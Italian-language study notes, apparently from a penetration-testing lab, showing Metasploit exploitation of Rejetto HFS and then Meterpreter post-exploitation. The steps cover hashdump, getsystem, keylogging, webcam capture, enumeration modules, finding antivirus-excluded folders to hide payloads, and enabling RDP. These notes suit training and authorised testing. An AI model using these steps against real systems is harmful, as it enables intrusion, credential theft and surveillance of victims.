# Windows Post Exploitation Modules

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

## Enumeration & Exploitation

```
service postgresql start && msfconsole
workspace -a windows_post
setg RHOSTS 10.2.23.169
db_nmap -sV 10.2.23.169
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
run
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Windows meterpreter command

```
sysinfo
getuid
help
getsystem
getuid
hashdump
show_mount
ps
migrate 2212 //oppure migrate explorere.exe
cd C:\\
dir
cat flag.txt
download flag.txt

//hashdump
//vari webcam commands  ome
//webcam_snap
//vari user interface commands
//keyscan_start //start keylogger
//screenshot

CTRL+Z //per mettere in background
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Post exploitation modules

```
sessions
```

<figure><img src="../../../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Migrare il processo della meterpreter session, o migrare l'architettura

```
search migrate platform:windows //per cambiare architettura del meterpreter payload
//use post/windows/menage/archmigrate
use post/windows/menage/migrate //per migrare Process ID
show options
set SESSION 1
run
```

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Elenca i privilegi dell'utente Windows della sessione attiva

```
search win_privs
use post/windows/gather/win_privs //elenca i privilegi dell'utente windows
show options
set SESSION 1
run //mostra informazioni come se è admin, è system, è nell'admin group, User Access Control abilitato per fare privesc
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Lista storico utenti loggati e attualmente loggati

```
search enum_logged_on
use post/windows/gather/enum_logged_on_users
show options
set SESSION 1
run
```

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Controlla se è una VM

Controlla se la macchina sulla quale è aperta una sessione è una VM

```
search checkvm
use post/windows/gather/checkvm
show options
set SESSION 1
run
```

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Enumerare i programmi installati sulla macchina

```
search enum_applications
use post/windows/gather/enum_applications
set SESSION 1
run
loot // i dati dei risultati sono salvati in file nascosti, che possiamo visualizzare con loot
```

Utile per identificare delle applicazioni, sopratutto di terze parti, in versioni vulnerabili.

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Loot

I dati dei risultati sono salvati in file nascosti, che possiamo visualizzare con loot

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Check antivirus e cartelle escluse dall'AV

```
search type:post platform:windows enum_av
use post/windows/gather/enum_av_excluded
show options
set SESSION 1
run
```

è utile sapere le cartelle con esclusioni perché possiamo usarle per caricarci nostri virus e payload in modo che non vengano individuati dall'antivirus.

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Enumerare i PC che fanno parte del dominio

```
search enum_computer
use post/windows/gather/enum_computers
show options
set SESSION 1
run
```

<figure><img src="../../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

In questo caso non fa parte di un dominio ma è un sistema a sé stante.

### Enumerare le patch di Microsoft installate

```
search enum_patches
use post/windows/gather/enum_patches
show options
set SESSION 1
run // e ci restituisce un errore dicendo di provare a migrare su un altro processo
sessions 1
ps //guardiamo gli altri processi disponibili e individuiamo svchost.exe che è SYSTEM
migrate 896
background
run // ci dà ancora errore allora andiamo a cercare da soli questa info
sessions 1
shell
systeminfo //comando di windows che ci mostra tra le altre cose tutte le patch installate
CTRL+C
background
```

<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

è possibile impostare la singola patch di Windows (il relativo KB) che vogliamo controllare se è stata installata.

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

### Enumerare le shares disponibili

```
search enum_shares
use post/windows/gather/enum_shares
show options
//l'opzione ENTERED serve per vedere le share recentemente inserite nel path di esplora risorse
set SESSION 1
run
```

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

La share print$ è di rete e serve per facilitare le stampe via SMB.

### Check RDP abilitato oppure abilita RDP sul target

```
search rdp platform:windows
use post/windows/menage/enable_rdp
show options
set SESSION 1
//non abbiamo le credenziali quindi non riusciamo a connetterci, ma possiamo usarlo per fare il check
run
// verifica se RDP è abilitato oppure lo abilita
```

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

